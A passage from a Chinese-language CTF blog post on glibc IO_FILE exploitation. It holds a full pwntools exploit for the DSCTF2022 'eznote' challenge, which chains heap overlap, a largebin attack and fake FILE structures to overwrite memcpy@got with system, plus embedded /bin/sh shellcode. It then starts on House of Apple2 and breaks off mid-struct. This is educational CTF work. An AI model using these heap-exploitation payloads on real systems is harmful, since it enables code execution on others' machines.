class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心部分，在构造的同时注意绕过检查</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">char</span> *new_buf;</span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br></pre></td></tr></table></figure>

<h3 id="eznote-DSCTF2022"><a href="#eznote-DSCTF2022" class="headerlink" title="eznote(DSCTF2022)"></a>eznote(DSCTF2022)</h3><p>程序存在一个数组的越界，导致在分配最后一个chunk的时候会将第一个chunk的size改写产生了堆叠，并且程序是通过calloc来分配堆块，不会直接从tcache中拿取chunk，并且存在沙盒只能orw。</p>
<p>主要的攻击思路：</p>
<ol>
<li>通过数组越界布置堆风水，泄露libc和heap的地址</li>
<li>largebin_attack劫持<code>_IO_list_all</code>，为构造IO_FILE做准备</li>
<li>进行4次IO_FILE的布局，也是本题的核心思路。第一个FILE用于将tcache_struct释放进入tcache中，也就是<code>heap_base + 0x10</code>的地方；第二次的FILE用于修改tcache_struct使得可以任意地址写；第三个FILE用于修改<code>memcpy@got</code>为system，注意这里要还原memset函数，因为memcpy函数结束之后还会调用memset；第四个FILE触发攻击。</li>
</ol>
<p>总结了一下构造此类FILE的模板：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE1.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br></pre></td></tr></table></figure>

<p>学习了e4l4师傅的WP，并做了一点注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">b&quot;./eznote&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./eznote&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./eznote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># make overlapping</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0xca1</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 7</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x408</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&#x27;Note3:\n&#x27;</span>)</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">io_list_all = libc_base + <span class="number">0x21a680</span></span><br><span class="line">io_str_jumps = libc_base + <span class="number">0x2166c0</span></span><br><span class="line">system = libc_base + <span class="number">0x50d60</span></span><br><span class="line">memcpy_got = libc_base + <span class="number">0x219160</span></span><br><span class="line">memset = libc_base + libc.sym[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memcpy_got&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;memset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin_attack</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x838</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0e0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0xb90</span>)</span><br><span class="line">pld += p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>, pld)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------house of pig----------- #</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free tcache_struct(size = 0x290) to tcache</span></span><br><span class="line">new_size = <span class="number">0x408</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x10</span>     <span class="comment"># tcache_struct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2d00</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE1 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE1 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE1 =  fake_IO_FILE1.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE1 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify tcache_stryct</span></span><br><span class="line">new_size = <span class="number">0x288</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x790</span>    <span class="comment"># data to modify tcache_stryct</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2dd0</span> - <span class="number">0x10</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE2 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE2 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE2 =  fake_IO_FILE2.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE2 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify memcpy@got -&gt; system</span></span><br><span class="line">new_size = <span class="number">0x128</span></span><br><span class="line">copy_heap_addr = heap_base + <span class="number">0x1830</span></span><br><span class="line">next_chain = heap_base + <span class="number">0x2e90</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE3 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE3 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE3 =  fake_IO_FILE3.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE3 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">new_size = <span class="number">0x108</span></span><br><span class="line">copy_heap_addr = heap_base</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">old_blen = (new_size - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE4 =  p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0xffffffffffffffff</span>)    <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr)    <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE4 += p64(copy_heap_addr + old_blen)   <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(next_chain)    <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(heap_base)     <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(<span class="number">0</span>)             <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE4 =  fake_IO_FILE4.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE4 += p64(io_str_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p16(<span class="number">1</span>) * <span class="number">0x20</span> + p64(memcpy_got - <span class="number">0x10</span>) * <span class="number">0x30</span>)     <span class="comment"># tcache struct</span></span><br><span class="line">edit(<span class="number">1</span>, fake_IO_FILE1)</span><br><span class="line">edit(<span class="number">2</span>, fake_IO_FILE2 + fake_IO_FILE3 + fake_IO_FILE4)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span> + p64(system) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(memset))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Apple2"><a href="#House-Of-Apple2" class="headerlink" title="House_Of_Apple2"></a>House_Of_Apple2</h2><blockquote>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273832.htm#msg_header_h1_0">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
</blockquote>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是利用FILE结构体中的<code>_wide_data</code>成员和<code>_IO_wfile_jumps</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span 